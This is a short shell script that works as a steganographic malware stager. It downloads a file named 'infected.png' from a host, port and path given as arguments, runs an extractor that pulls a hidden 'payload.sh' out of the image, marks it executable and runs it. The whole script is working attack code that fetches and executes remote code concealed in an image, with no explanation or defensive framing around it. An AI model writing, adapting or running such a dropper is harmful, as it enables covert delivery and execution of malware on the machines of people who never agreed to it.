#!/bin/sh
set -e
if [ "$#" -ne 3 ]; then
    echo "Illegal number of parameters"
fi
	
curl -o infected.png http://"$1":"$2"/"$3"

python3 extractor.py infected.png payload.sh

chmod +x payload.sh

./payload.sh
